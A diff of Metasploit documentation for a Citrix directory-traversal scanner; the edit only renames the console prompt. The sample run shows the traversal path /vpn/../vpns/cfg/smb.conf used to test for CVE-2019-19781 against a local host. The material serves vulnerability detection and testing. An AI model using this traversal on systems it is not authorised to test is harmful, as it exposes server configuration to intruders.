@@ -27,7 +27,7 @@ This module checks if a target server is vulnerable by issuing an HTTP GET reque
 ## Scenarios
 
 ```
-msf5 auxiliary(scanner/http/citrix_dir_traversal) > options
+msf auxiliary(scanner/http/citrix_dir_traversal) > options
 
 Module options (auxiliary/scanner/http/citrix_dir_traversal):
 
@@ -42,13 +42,13 @@ Module options (auxiliary/scanner/http/citrix_dir_traversal):
    THREADS    1                          yes       The number of concurrent threads (max one per host)
    VHOST                                 no        HTTP server virtual host
 
-msf5 auxiliary(scanner/http/citrix_dir_traversal) > run
+msf auxiliary(scanner/http/citrix_dir_traversal) > run
 
 [+] http://127.0.0.1:8080/vpn/../vpns/cfg/smb.conf - The target is vulnerable to CVE-2019-19781.
 [+] Obtained HTTP response code 200 for http://127.0.0.1:8080/vpn/../vpns/cfg/smb.conf. This means that access to /vpn/../vpns/cfg/smb.conf was obtained via directory traversal.
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf5 auxiliary(scanner/http/citrix_dir_traversal) >
+msf auxiliary(scanner/http/citrix_dir_traversal) >
 ```
 
 ## References
